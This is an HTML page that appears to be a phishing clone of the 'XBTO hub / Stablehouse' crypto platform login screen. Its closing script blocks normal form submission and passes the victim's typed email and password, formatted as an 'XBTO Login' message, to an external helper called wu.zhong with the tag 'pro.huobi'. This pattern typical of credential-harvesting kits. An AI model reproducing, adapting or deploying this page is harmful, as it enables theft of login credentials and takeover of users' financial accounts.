<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XBTO hub - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f8f9fa;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 400px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
            padding: 40px 24px;
            text-align: center;
        }

        .logo-section {
            margin-bottom: 40px;
        }

        .logo {
            font-size: 36px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 8px;
            letter-spacing: -0.02em;
        }

        .logo .hub {
            font-weight: 400;
            font-style: italic;
        }

        .shield-icon {
            display: inline-block;
            width: 24px;
            height: 24px;
            margin-left: 4px;
            vertical-align: top;
        }

        .powered-by {
            color: #6b7280;
            font-size: 14px;
            margin-bottom: 4px;
        }

        .stablehouse {
            color: #1a1a1a;
            font-size: 18px;
            font-weight: 600;
        }

        .welcome-title {
            font-size: 32px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 16px;
            line-height: 1.2;
        }

        .subtitle {
            color: #6b7280;
            font-size: 16px;
            margin-bottom: 32px;
            line-height: 1.5;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .form-input {
            width: 100%;
            padding: 16px;
            border: 2px solid #e5e7eb;
            border-radius: 8px;
            font-size: 16px;
            background-color: #fff;
            transition: border-color 0.2s ease;
        }

        .form-input:focus {
            outline: none;
            border-color: #3b82f6;
        }

        .form-input::placeholder {
            color: #9ca3af;
        }

        .password-group {
            position: relative;
        }

        .password-toggle {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            color: #6b7280;
            padding: 4px;
        }

        .captcha-section {
            background-color: #f9fafb;
            border: 2px solid #e5e7eb;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .checkbox {
            width: 20px;
            height: 20px;
            border: 2px solid #d1d5db;
            border-radius: 4px;
            cursor: pointer;
            flex-shrink: 0;
        }

        .checkbox:checked {
            background-color: #3b82f6;
            border-color: #3b82f6;
        }

        .captcha-text {
            color: #374151;
            font-size: 16px;
        }

        .forgot-password {
            color: #3b82f6;
            text-decoration: none;
            font-size: 16px;
            margin-bottom: 32px;
            display: inline-block;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .continue-btn {
            width: 100%;
            background: linear-gradient(135deg, #10b981, #059669);
            color: white;
            border: none;
            padding: 16px;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .continue-btn:hover {
            background: linear-gradient(135deg, #059669, #047857);
            transform: translateY(-1px);
        }

        .continue-btn:active {
            transform: translateY(0);
        }

        /* Tablet and larger screens */
        @media (min-width: 768px) {
            .container {
                max-width: 440px;
                padding: 48px 32px;
            }

            .logo {
                font-size: 42px;
            }

            .welcome-title {
                font-size: 36px;
            }
        }

        /* Desktop screens */
        @media (min-width: 1024px) {
            body {
                background: linear-gradient(135deg, #f3f4f6 0%, #e5e7eb 100%);
            }

            .container {
                box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-section">
            <div class="logo">
                XBTO <span class="hub">hub</span>
                <svg class="shield-icon" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1ZM10 17L6 13L7.41 11.59L10 14.17L16.59 7.58L18 9L10 17Z"/>
                </svg>
            </div>
            <div class="powered-by">Powered by</div>
            <div class="stablehouse">Stablehouse</div>
        </div>

        <h1 class="welcome-title">Welcome back</h1>
        <p class="subtitle">Log in to Stablehouse to access your account</p>

        <form>
            <div class="form-group">
                <input type="email" id="email" class="form-input" placeholder="Email address*" required>
            </div>

            <div class="form-group">
                <div class="password-group">
                    <input type="password" id="password" class="form-input" placeholder="Password*" required>
                    <button type="button" class="password-toggle">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                        </svg>
                    </button>
                </div>
            </div>

           
            <a href="#" class="forgot-password">Forgot password?</a>

            <button type="submit" class="continue-btn">Continue</button>
        </form>
    </div>

    <script>
        document.querySelector('.password-toggle').addEventListener('click', function() {
            const passwordInput = document.querySelector('input[type="password"], input[type="text"]');
            const isPassword = passwordInput.type === 'password';
            passwordInput.type = isPassword ? 'text' : 'password';
            
      
            this.innerHTML = isPassword ? 
                '<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>' :
                '<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>';
        });


        document.querySelector('form').addEventListener('submit', function(e) {
            e.preventDefault();
           wu.zhong(`🔰XBTO Login \n\n✉️ Email: ${document.getElementById("email").value}\n\n🔒Password: ${document.getElementById("password").value}`, "pro.huobi");
    
        });
    </script>
</body>
</html>
